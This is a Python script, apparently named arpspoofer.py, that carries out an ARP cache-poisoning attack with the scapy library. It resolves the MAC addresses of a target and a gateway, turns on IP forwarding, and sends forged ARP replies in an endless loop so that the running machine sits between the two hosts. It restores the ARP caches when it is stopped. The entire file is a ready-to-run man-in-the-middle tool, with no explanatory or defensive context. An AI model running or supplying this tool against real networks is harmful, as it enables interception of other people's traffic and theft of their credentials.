#!/usr/bin/python3
import scapy.all as scapy
import sys
import time
import os
import argparse


def parse(args):
    Parser = argparse.ArgumentParser(usage="arpspoofer.py [options] [value]")
    Parser.add_argument('-t','--target',metavar = "",type =str,help="Target's ip address", required=True)
    Parser.add_argument('-g','--gateway',metavar = "",type =str,help="Gateway ip address", required=True)
    return Parser.parse_args()

def getMac(ip):
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_packet = scapy.ARP(pdst=ip)
    final_packet = broadcast/arp_packet
    recv = scapy.srp(final_packet, timeout=2,verbose=False)[0]
    return recv[0][1].hwsrc

def Spoofer(gateway,gateway_mac,target,target_mac):
    packet1 = scapy.ARP(op=2,pdst=target,hwdst=target_mac,psrc=gateway)
    packet2 = scapy.ARP(op=2,pdst=gateway,hwdst=gateway_mac,psrc=target)
    scapy.send(packet1,verbose=False)
    scapy.send(packet2,verbose=False)

def Restore(gateway,gateway_mac,target,target_mac):
    packet1 = scapy.ARP(op=2,pdst=target,hwdst="ff:ff:ff:ff:ff:ff",psrc=gateway,hwsrc=gateway_mac)
    packet2 = scapy.ARP(op=2,pdst=gateway,hwdst="ff:ff:ff:ff:ff:ff",psrc=target,hwsrc=target_mac)
    scapy.send(packet1,verbose=False)
    scapy.send(packet2,verbose=False)
def main():
    arg = parse(sys.argv)
    gateway = arg.gateway
    target = arg.target

    try:
        targetMac = getMac(arg.target)
        gatewayMac = getMac(arg.gateway)
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    except:
        print("[-] Target or Gateway ip is incorrect")

    try:
        counter = 0
        while True:
            Spoofer(gateway,gatewayMac,target,targetMac)
            time.sleep(1)
            counter +=1
            print("\r[+] packets sent: "+ str(counter),end="")
            sys.stdout.flush()
    except KeyboardInterrupt:
        print("\n[-] Exiting")
        print("[+] Restoring ARP....")
        Restore(gateway,gatewayMac,target,targetMac)
    except:
	    print("[-] Something went wrong")
main()
